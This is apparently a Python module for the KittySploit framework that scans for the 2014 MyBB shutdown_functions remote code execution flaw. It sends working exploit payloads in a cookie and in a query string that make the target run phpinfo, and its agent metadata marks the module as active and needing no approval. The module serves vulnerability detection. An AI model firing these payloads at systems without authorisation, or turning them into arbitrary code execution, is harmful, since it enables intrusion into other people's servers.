#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""MyBB shutdown_functions / GLOBALS RCE (Nov 2014)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'MyBB - shutdown_functions RCE Detection',
        'description': (
            'Detects MyBB <= 1.8.2 RCE via Cookie GLOBALS=1;shutdown_functions phpinfo '
            'or query-string shutdown_functions.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'mybb', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://blog.checkpoint.com/2014/11/20/mybb-zero-day/',
        ],
    }

    def run(self):
        cookie = (
            'GLOBALS=1; shutdown_functions[0][function]=phpinfo; '
            'shutdown_functions[0][arguments][]=-1'
        )
        for base in ('', '/mybb', '/forum'):
            r = self.http_request(
                method='GET',
                path=f'{base}/',
                headers={'Cookie': cookie},
                allow_redirects=False,
            )
            if r and r.status_code == 200:
                body = r.text or ''
                if '<title>phpinfo()' in body or ('PHP Version' in body and 'Configuration File' in body):
                    self.set_info(
                        severity='critical',
                        reason='MyBB shutdown_functions RCE (cookie)',
                        path=f'{base}/',
                    )
                    return True
            path = (
                f'{base}/index.php?shutdown_functions[0][function]=phpinfo'
                '&shutdown_functions[0][arguments][]=-1'
            )
            r2 = self.http_request(method='GET', path=path, allow_redirects=False)
            if r2 and r2.status_code == 200:
                body = r2.text or ''
                if '<title>phpinfo()' in body or ('PHP Version' in body and 'Configuration File' in body):
                    self.set_info(
                        severity='critical',
                        reason='MyBB shutdown_functions RCE (query)',
                        path=f'{base}/index.php',
                    )
                    return True
        return False
